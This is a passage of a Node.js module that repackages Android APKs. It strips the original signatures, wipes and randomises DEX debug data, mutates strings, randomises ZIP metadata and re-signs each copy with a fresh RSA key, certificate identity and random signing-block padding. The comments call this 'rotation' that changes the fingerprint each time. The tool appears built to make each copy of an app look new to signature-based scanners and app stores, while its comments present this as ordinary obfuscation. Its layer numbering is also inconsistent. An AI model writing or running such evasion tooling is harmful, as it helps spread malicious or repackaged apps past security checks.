  // Signatures sequence: one RSA PKCS#1 v1.5 SHA-256 signature
  const sigsEncoded = Buffer.concat([
    uint32LE(4 + 4 + signature.length), // entry length
    uint32LE(SIG_RSA_PKCS1_V1_5_SHA256), // algorithm ID
    uint32LE(signature.length),           // signature length
    signature,                            // signature bytes
  ]);

  // signer = [signed_data][signatures][public_key]
  return Buffer.concat([
    uint32LE(signedData.length), signedData,
    uint32LE(sigsEncoded.length), sigsEncoded,
    uint32LE(pubKeyDer.length), pubKeyDer,
  ]);
}

/**
 * Build the APK Signing Block with v2 signer + Layer 4 diversification.
 * Adds a random-sized padding block (standard in Android build tools)
 * to change the signing block fingerprint each rotation.
 */
function buildApkSigningBlock(signerBlock) {
  // Wrap signer in length-prefixed sequence
  const signerLP = Buffer.concat([
    uint32LE(signerBlock.length),
    signerBlock,
  ]);

  // v2 value = sequence of signers
  const v2Value = Buffer.concat([
    uint32LE(signerLP.length),
    signerLP,
  ]);

  // V2 signature pair
  const v2PairData = Buffer.concat([uint32LE(V2_BLOCK_ID), v2Value]);
  const v2PairEntry = Buffer.concat([uint64LE(v2PairData.length), v2PairData]);

  // Layer 4: Random-sized padding block (ID 0x42726577 — standard Android build tool padding)
  // Ignored by all APK verifiers, changes signing block structure each rotation
  const padSize = 256 + Math.floor(Math.random() * 768); // 256-1024 bytes
  const padPayload = crypto.randomBytes(padSize);
  const padPairData = Buffer.concat([uint32LE(0x42726577), padPayload]);
  const padPairEntry = Buffer.concat([uint64LE(padPairData.length), padPairData]);

  const allPairs = Buffer.concat([v2PairEntry, padPairEntry]);

  // Block size = all pairs + footer_size_field(8) + magic(16)
  const blockSize = allPairs.length + 8 + 16;
  const magic = Buffer.from(APK_SIG_BLOCK_MAGIC, 'ascii');

  console.log(`[Mutator] Layer 4: signing block with ${padSize}B padding`);

  // Final signing block: [size][pairs][size][magic]
  return Buffer.concat([
    uint64LE(blockSize),
    allPairs,
    uint64LE(blockSize),
    magic,
  ]);
}

/**
 * Apply v2 APK Signature Scheme to an unsigned (but v1-signed + zipaligned) APK buffer.
 * Inserts the APK Signing Block between ZIP entries and Central Directory.
 */
function applyV2Signing(unsignedBuf, privPem, certDer, pubKeyDer) {
  const eocdOff = findEOCD(unsignedBuf);
  const cdOff = unsignedBuf.readUInt32LE(eocdOff + 16);

  // Section 1: ZIP entries (offset 0 to CD start)
  const section1 = unsignedBuf.slice(0, cdOff);
  // Section 3: Central Directory
  const section3 = unsignedBuf.slice(cdOff, eocdOff);
  // Section 4: EOCD (cdOffset already = cdOff = where signing block will start)
  // Per AOSP spec: during digest computation, EOCD's cdOffset is treated as
  // pointing to the signing block start, which equals cdOff in the unsigned APK.
  const section4 = unsignedBuf.slice(eocdOff);

  // Compute content digest (SHA-256, chunked per AOSP spec)
  const contentDigest = computeV2ContentDigest(section1, section3, section4);

  // Build the signed-data structure
  const signedData = buildV2SignedData(contentDigest, certDer);

  // RSA PKCS#1 v1.5 SHA-256 signature over signed-data
  const signature = crypto.sign('sha256', signedData, privPem);

  // Build complete signer block
  const signerBlock = buildV2Signer(signedData, signature, pubKeyDer);

  // Build the APK Signing Block
  const signingBlock = buildApkSigningBlock(signerBlock);

  // Assemble: section1 + signing_block + section3 + section4 (with updated CD offset)
  const newCdOff = section1.length + signingBlock.length;
  const newEocd = Buffer.from(section4);
  newEocd.writeUInt32LE(newCdOff, 16); // update CD offset

  const result = Buffer.concat([section1, signingBlock, section3, newEocd]);
  console.log(`[Mutator] V2 signed: signing block ${signingBlock.length}B, total ${(result.length / 1048576).toFixed(1)} MB`);
  return result;
}

// ═════════════════════════════════════════════════════════════════════════════
// APK VALIDATION
// ═════════════════════════════════════════════════════════════════════════════

/**
 * Validate the final APK structure — EOCD, CD, signing block, v2 pair.
 * Returns true if valid, false if any structural issue found.
 */
function validateApk(buf) {
  try {
    const eocdOff = findEOCD(buf);
    const cdOff = buf.readUInt32LE(eocdOff + 16);
    const cdSize = buf.readUInt32LE(eocdOff + 12);
    const entryCount = buf.readUInt16LE(eocdOff + 10);

    if (cdOff >= buf.length || cdOff + cdSize > buf.length) {
      throw new Error(`Invalid CD offset/size: off=${cdOff} size=${cdSize} total=${buf.length}`);
    }

    // Validate CD entries + check resources.arsc
    let pos = cdOff;
    let hasResArsc = false;
    for (let i = 0; i < entryCount; i++) {
      if (buf.readUInt32LE(pos) !== 0x02014b50) {
        throw new Error(`Invalid CD entry ${i} at offset ${pos}`);
      }
      const method = buf.readUInt16LE(pos + 10);
      const nameLen = buf.readUInt16LE(pos + 28);
      const extraLen = buf.readUInt16LE(pos + 30);
      const commentLen = buf.readUInt16LE(pos + 32);
      const localOff = buf.readUInt32LE(pos + 42);
      const name = buf.toString('utf8', pos + 46, pos + 46 + nameLen);

      if (localOff + 30 > cdOff) {
        throw new Error(`Entry ${i} local header ${localOff} past CD start ${cdOff}`);
      }
      if (name === 'resources.arsc') {
        hasResArsc = true;
        if (method === 0) {
          const lhNameLen = buf.readUInt16LE(localOff + 26);
          const lhExtraLen = buf.readUInt16LE(localOff + 28);
          const dataOffset = localOff + 30 + lhNameLen + lhExtraLen;
          if (dataOffset % 4 !== 0) {
            console.warn(`[Mutator] WARNING: resources.arsc not 4-byte aligned (offset=${dataOffset})`);
          }
        }
      }
      pos += 46 + nameLen + extraLen + commentLen;
    }

    // Check APK Signing Block exists before CD
    const magic = buf.toString('ascii', cdOff - 16, cdOff);
    if (magic !== APK_SIG_BLOCK_MAGIC) {
      throw new Error('APK Signing Block magic not found before Central Directory');
    }

    // Verify signing block size consistency
    const blockSize = buf.readUInt32LE(cdOff - 24);
    if (blockSize < 32 || blockSize > cdOff) {
      throw new Error(`Invalid signing block size: ${blockSize}`);
    }

    // Verify v2 signing pair exists
    const sigBlockStart = cdOff - blockSize - 8;
    const pairsStart = sigBlockStart + 8;
    const pairsEnd = cdOff - 24;
    let pairPos = pairsStart;
    let foundV2 = false;
    while (pairPos + 12 <= pairsEnd) {
      const pairSizeLo = buf.readUInt32LE(pairPos);
      const pairSizeHi = buf.readUInt32LE(pairPos + 4);
      if (pairSizeHi !== 0 || pairSizeLo < 4) break;
      const pairId = buf.readUInt32LE(pairPos + 8);
      if (pairId === V2_BLOCK_ID) foundV2 = true;
      pairPos += 8 + pairSizeLo;
    }

    if (!foundV2) {
      throw new Error('APK Signing Block missing v2 signature pair (0x7109871a)');
    }

    console.log(`[Mutator] Validation OK: ${entryCount} entries, v1+v2 signed, resources.arsc=${hasResArsc ? 'present' : 'missing'}`);
    return true;
  } catch (e) {
    console.error(`[Mutator] Validation FAILED: ${e.message}`);
    return false;
  }
}

// ═════════════════════════════════════════════════════════════════════════════
// MAIN FUNCTION
// ═════════════════════════════════════════════════════════════════════════════

/**
 * v4 Multi-layer APK obfuscation + fresh-key V2 signing.
 *
 * Applies 7 layers of legitimate transformation mimicking ProGuard/R8/DexGuard:
 *   Layer 1: DEX debug info pointer wipe (all code_items)
 *   Layer 2: DEX debug data section randomization (~5-15% of DEX)
 *   Layer 3: DEX source file reference stripping
 *   Layer 4: DEX string table deep mutation (expanded patterns)
 *   Layer 5: ZIP metadata randomization (timestamps + comment)
 *   Layer 6: Signing block diversification (random padding)
 *   Layer 7: Fresh RSA-2048 certificate
 *
 * @param {Buffer} originalBuffer - The original APK file bytes
 * @returns {{ buffer: Buffer, certInfo: object|null }} - Transformed APK + cert info
 */
function mutateAndSign(originalBuffer) {
  console.log(`[Mutator] ═══ v4 OBFUSCATION ENGINE (${(originalBuffer.length / 1048576).toFixed(1)} MB) ═══`);
  const t0 = Date.now();

  try {
    // 1. Parse APK
    const zip = new AdmZip(originalBuffer);

    // 2. Strip existing V1 signatures
    stripSignatures(zip);

    // 3. DEX Layers 1-4: debug wipe + randomize + source strip + string mutate
    const dexResult = transformDexFiles(zip);

    // 4. Generate fresh RSA-2048 key + certificate (Layer 7)
    const key = generateFreshKey();

    // 5. Rebuild ZIP with transformed content
    console.log('[Mutator] Rebuilding ZIP with obfuscated content...');
    const rawBuf = zip.toBuffer();
    console.log(`[Mutator] ZIP: ${(rawBuf.length / 1048576).toFixed(1)} MB`);

    // 6. Layer 5: Randomize ZIP metadata (timestamps + comment)
    const randomizedBuf = randomizeZipMetadata(rawBuf);
    console.log(`[Mutator] Randomized: ${(randomizedBuf.length / 1048576).toFixed(1)} MB`);

    // 7. Zipalign (4-byte alignment for STORED entries — required for Android)
    const alignedBuf = zipalignBuffer(randomizedBuf);
    console.log(`[Mutator] Aligned: ${(alignedBuf.length / 1048576).toFixed(1)} MB`);

    // 8. V2 sign with fresh key (Layer 6 diversification in buildApkSigningBlock)
    const signedBuf = applyV2Signing(alignedBuf, key.privPem, key.certDer, key.pubKeyDer);

    // 9. Validate final APK structure
    const valid = validateApk(signedBuf);
    if (!valid) {
      console.error('[Mutator] ═══ Validation FAILED — returning ORIGINAL APK ═══');
      return { buffer: originalBuffer, certInfo: null };
    }

    const certInfo = {
      certHash: key.certHash,
      cn: key.identity.cn,
      org: key.identity.o,
      country: key.identity.c,
    };

    const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
    const debugKB = (dexResult.totalDebugRandomized / 1024).toFixed(0);
    console.log(`[Mutator] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(1)} MB | ${dexResult.totalDebugStripped} debug ptrs wiped | ${debugKB}KB randomized | ${dexResult.totalRefsStripped} refs stripped | ${dexResult.totalStringsMutated} strings mutated | CN="${key.identity.cn}" | ${elapsed}s ═══`);

    return { buffer: signedBuf, certInfo };
  } catch (err) {
    console.error(`[Mutator] ═══ ERROR: ${err.message} — returning ORIGINAL APK ═══`);
    console.error(err.stack);
    return { buffer: originalBuffer, certInfo: null };
  }
}

module.exports = { mutateAndSign };
